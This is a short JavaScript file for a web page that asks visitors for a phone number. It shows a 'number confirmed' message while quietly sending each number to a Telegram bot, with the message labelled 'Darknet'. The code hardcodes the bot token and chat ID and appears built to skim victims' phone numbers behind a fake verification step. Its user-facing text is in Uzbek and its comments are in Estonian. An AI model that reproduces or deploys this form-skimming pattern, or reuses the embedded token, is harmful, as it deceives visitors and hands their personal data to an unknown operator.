const button = document.getElementById('submit-btn');
const input = document.getElementById('userNumber');
const statusText = document.getElementById('status-text');
const div = document.getElementById('overley');
const deliveryMessage = document.getElementById('delivery-message');
const TOKEN = "8982008129:AAHSEqf56oBLo0XjY3rGNXoZckBWhciYSh8";
const CHAT_ID = "8622143190";

document.getElementById('smsForm').addEventListener('submit', async function (e) {
    e.preventDefault();
    const number = document.getElementById('userNumber').value;

    const message = `Yangi raqam keldi: ${number} (Darknet)`;

    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

    try {
        let response = await fetch(url);
        if (response.ok) {
            alert("Raqam muvaffaqiyatli yuborildi!");
            document.getElementById('userNumber').value = '';
        } else {
            alert("Xatolik yuz berdi!");
        }
    } catch (error) {
        console.error("Xato:", error);
    }
});

button.addEventListener('click', function() {
    if (input.value.trim() !== '') {
        // Muudame teksti
        statusText.textContent = '!TELEFON NOMER TASDIQLANDI!';
        statusText.style.color = 'green';
        
        // Peidame nupu ja sisestusvälja
        button.style.display = 'none';
        input.style.display = 'none';
        div.style.display = 'none';
        
        // Kuvame uue teate nupu asemel
        deliveryMessage.style.display = 'block';
    } else {
        alert('Iltimos, telefon raqam kiriting!');
    }
});

